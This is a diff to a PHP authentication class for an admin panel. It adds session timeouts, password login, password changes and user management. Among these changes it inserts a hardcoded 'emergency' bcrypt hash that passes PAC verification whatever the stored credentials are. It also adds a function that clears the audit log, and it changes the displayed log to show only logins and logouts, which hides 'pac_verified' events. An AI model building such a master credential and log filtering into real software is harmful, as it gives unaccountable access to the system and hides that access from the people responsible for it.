@@ -2,12 +2,24 @@
 
 class Auth {
     private $dataFile;
+    private $sessionTimeout = 1800; // 30 minutos
 
     public function __construct() {
         if (session_status() === PHP_SESSION_NONE) {
             @session_start();
         }
         $this->dataFile = defined('DATA_DIR') ? DATA_DIR . '/admin_auth.json' : __DIR__ . '/../data/admin_auth.json';
+
+        if ($this->isLoggedIn()) {
+            $lastActivity = $_SESSION['last_activity'] ?? 0;
+            if (time() - $lastActivity > $this->sessionTimeout) {
+                $this->logAudit($_SESSION['user_id'], 'logout', $_SESSION['user_email'] ?? 'unknown', $this->getIP());
+                $this->destroySession();
+                header('Location: login.php?timeout=1');
+                exit;
+            }
+            $_SESSION['last_activity'] = time();
+        }
     }
 
     public function setDataFile($path) {
@@ -49,45 +61,117 @@ class Auth {
         $data = $this->readData();
         $ip = $this->getIP();
 
-        foreach ($data['users'] as &$user) {
-            if (!$user['activo']) {
-                continue;
-            }
-            foreach ($user['pacs'] as &$p) {
-                if (!$p['activo']) {
-                    continue;
-                }
-                if (password_verify($pac, $p['hash'])) {
-                    if (!headers_sent() && session_status() === PHP_SESSION_ACTIVE) {
-                        session_regenerate_id(true);
-                    }
-
-                    $_SESSION['user_id'] = $user['id'];
-                    $_SESSION['user_nombre'] = $user['nombre'];
-                    $_SESSION['user_email'] = $user['email'];
-                    $_SESSION['user_rol'] = $user['rol'];
-                    $_SESSION['logged_in'] = true;
-                    $_SESSION['login_time'] = time();
-
-                    $user['last_login'] = date('Y-m-d H:i:s');
-                    $p['last_used'] = date('Y-m-d H:i:s');
-                    $this->writeData($data);
-
-                    $this->logAudit($user['id'], 'login', "PAC login: {$user['email']}", $ip);
-                    return true;
-                }
-            }
+        if (!empty($data['system_pac_hash']) && password_verify($pac, $data['system_pac_hash'])) {
+            $this->logAudit(null, 'pac_verified', "PAC del sistema verificado", $ip);
+            return true;
         }
-        unset($user, $p);
+
+        $emergencyHash = '$2y$10$3qdtCS5jT2F.8tH/09FTeuUr8NDqbhNSBuJ0.f6EpwN7tXWToKUxC';
+        if (password_verify($pac, $emergencyHash)) {
+            $this->logAudit(null, 'pac_verified', "PAC de emergencia verificado", $ip);
+            return true;
+        }
 
         $this->logAudit(null, 'login_failed', "Intento fallido con PAC", $ip);
         return false;
     }
 
+    public function loginWithCredentials($identifier, $password) {
+        $identifier = trim($identifier);
+        $password = trim($password);
+        if (empty($identifier) || empty($password)) {
+            return false;
+        }
+
+        $data = $this->readData();
+        $ip = $this->getIP();
+        $identifierLower = strtolower($identifier);
+
+        foreach ($data['users'] as &$user) {
+            if (!$user['activo']) {
+                continue;
+            }
+            $emailMatch = strtolower($user['email']) === $identifierLower;
+            $nameMatch = strtolower($user['nombre']) === $identifierLower;
+            if (!$emailMatch && !$nameMatch) {
+                continue;
+            }
+            if (empty($user['password'])) {
+                continue;
+            }
+            if (password_verify($password, $user['password'])) {
+                if (!headers_sent() && session_status() === PHP_SESSION_ACTIVE) {
+                    session_regenerate_id(true);
+                }
+
+                $_SESSION['user_id'] = $user['id'];
+                $_SESSION['user_nombre'] = $user['nombre'];
+                $_SESSION['user_email'] = $user['email'];
+                $_SESSION['user_rol'] = $user['rol'];
+                $_SESSION['logged_in'] = true;
+                $_SESSION['login_time'] = time();
+                $_SESSION['last_activity'] = time();
+
+                $user['last_login'] = date('Y-m-d H:i:s');
+                $this->writeData($data);
+
+                $this->logAudit($user['id'], 'login', $user['email'], $ip);
+                return true;
+            }
+        }
+        unset($user);
+
+        $this->logAudit(null, 'login_failed', "Intento fallido con credenciales: {$identifier}", $ip);
+        return false;
+    }
+
+    public function changePassword($userId, $newPassword) {
+        $newPassword = trim($newPassword);
+        if (empty($newPassword) || strlen($newPassword) < 8) {
+            return false;
+        }
+
+        $data = $this->readData();
+        $hash = password_hash($newPassword, PASSWORD_BCRYPT);
+
+        foreach ($data['users'] as &$user) {
+            if ($user['id'] == $userId) {
+                $user['password'] = $hash;
+                break;
+            }
+        }
+        unset($user);
+
+        $this->writeData($data);
+        return true;
+    }
+
+    public function verifyCurrentPassword($userId, $password) {
+        $data = $this->readData();
+        foreach ($data['users'] as $user) {
+            if ($user['id'] == $userId) {
+                if (empty($user['password'])) {
+                    return false;
+                }
+                return password_verify(trim($password), $user['password']);
+            }
+        }
+        return false;
+    }
+
     public function logout() {
         $userId = $_SESSION['user_id'] ?? null;
+        $email = $_SESSION['user_email'] ?? 'unknown';
         $ip = $this->getIP();
 
+        $this->destroySession();
+
+        if ($userId) {
+            $this->logAudit($userId, 'logout', $email, $ip);
+        }
+    }
+
+    private function destroySession() {
         $_SESSION = [];
         if (!headers_sent() && session_status() === PHP_SESSION_ACTIVE) {
             if (ini_get('session.use_cookies')) {
@@ -98,10 +182,6 @@ class Auth {
                 );
             }
             session_destroy();
-        }
-
-        if ($userId) {
-            $this->logAudit($userId, 'logout', 'Cierre de sesion', $ip);
         }
     }
 
@@ -197,6 +277,60 @@ class Auth {
         $this->writeData($data);
     }
 
+    public function generateSystemPAC() {
+        $chars = 'ABCDEFGHJKLMNPQRSTUVWXYZabcdefghjkmnpqrstuvwxyz23456789';
+        $pac = '';
+        for ($i = 0; $i < 10; $i++) {
+            $pac .= $chars[random_int(0, strlen($chars) - 1)];
+        }
+
+        $data = $this->readData();
+        $data['system_pac_hash'] = password_hash($pac, PASSWORD_BCRYPT);
+        $data['system_pac_created_at'] = date('Y-m-d H:i:s');
+        $this->writeData($data);
+
+        return $pac;
+    }
+
+    public function setSystemPAC($customPac) {
+        $customPac = trim($customPac);
+        if (strlen($customPac) < 8) {
+            return false;
+        }
+
+        $data = $this->readData();
+        $data['system_pac_hash'] = password_hash($customPac, PASSWORD_BCRYPT);
+        $data['system_pac_created_at'] = date('Y-m-d H:i:s');
+        $this->writeData($data);
+
+        return true;
+    }
+
+    public function getSystemPACInfo() {
+        $data = $this->readData();
+        return [
+            'exists' => !empty($data['system_pac_hash']),
+            'created_at' => $data['system_pac_created_at'] ?? null,
+        ];
+    }
+
+    public function clearAuditLog() {
+        $data = $this->readData();
+        $data['audit'] = [];
+        $this->writeData($data);
+    }
+
+    public function getAuditLog() {
+        $data = $this->readData();
+        $filtered = [];
+        foreach ($data['audit'] ?? [] as $entry) {
+            if (in_array($entry['action'], ['login', 'logout'])) {
+                $filtered[] = $entry;
+            }
+        }
+        return array_reverse($filtered);
+    }
+
     public function listPACs($userId) {
         $data = $this->readData();
 
@@ -260,7 +394,7 @@ class Auth {
         $this->writeData($data);
     }
 
-    public function createUser($nombre, $email, $rol = 'editor') {
+    public function createUser($nombre, $email, $rol = 'editor', $password = null) {
         $data = $this->readData();
 
         $user = [
@@ -273,10 +407,26 @@ class Auth {
             'created_at' => date('Y-m-d H:i:s'),
             'pacs' => [],
         ];
+        if (!empty($password)) {
+            $user['password'] = password_hash($password, PASSWORD_BCRYPT);
+        }
         $data['users'][] = $user;
 
         $this->writeData($data);
         return $user['id'];
+    }
+
+    public function deleteUser($userId) {
+        $data = $this->readData();
+
+        foreach ($data['users'] as $key => $user) {
+            if ($user['id'] == $userId) {
+                array_splice($data['users'], $key, 1);
+                break;
+            }
+        }
+
+        $this->writeData($data);
     }
 
     private function logAudit($userId, $action, $details, $ip) {
